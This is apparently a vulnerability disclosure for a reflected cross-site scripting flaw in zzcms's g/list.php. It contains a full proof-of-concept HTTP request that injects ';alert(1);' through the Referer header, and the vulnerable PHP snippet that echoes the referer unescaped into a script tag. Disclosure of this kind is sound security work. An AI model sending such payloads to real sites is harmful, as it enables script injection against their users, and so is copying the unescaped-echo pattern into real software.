####  g/list.php exists frontend reflective xss



First visit the page

![image-20240827210856535](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240827210856535.png)



Then use burpsuit to intercept the traffic

POC visits the page first

```java
POST /g/list.php HTTP/1.1
Host: zzcms:8786
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=4pj41bdnhl1msnbrl2lljv1iqm; __51cke__=; xywpwx_bakusername=admin; xywpwx_snsjjssbdvqm=aca496e77ae7ceff46c2f8e72f4235d5; qebak_efourcheck=be67da7f3e3c39cd439799a20c67f8b4; XDEBUG_SESSION=PHPSTORM; xywpwx_bakrnd=zPwzzERUvdP4; xywpwx_loginebakckpass=03269d863bac377ff8cfb81722e356e3; xywpwx_baklogintime=1724589372; __tins__713776=%7B%22sid%22%3A%201724603456590%2C%20%22vd%22%3A%206%2C%20%22expires%22%3A%201724605579607%7D; __51laig__=34
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 19
Referer: ';alert(1);'

action=clearcookies
```

![image-20240827211356005](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240827211356005.png)



![image-20240827211412877](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240827211412877.png)

Code Analysis

Locate g/list.php

```java
if (isset($action)&&$action=='clearcookies'){
setcookie("zzcmscpid","xxx",1);
echo "<script>location.href='".$_SERVER['HTTP_REFERER']."'</script>";//上一页$_SERVER["REQUEST_URI"]当前页
}
```

You can see that there is a judgment on our action first, and then if it is equal to clearcookies, after that it will echo splice our $_SERVER['HTTP_REFERERER'] resulting in xss injection.
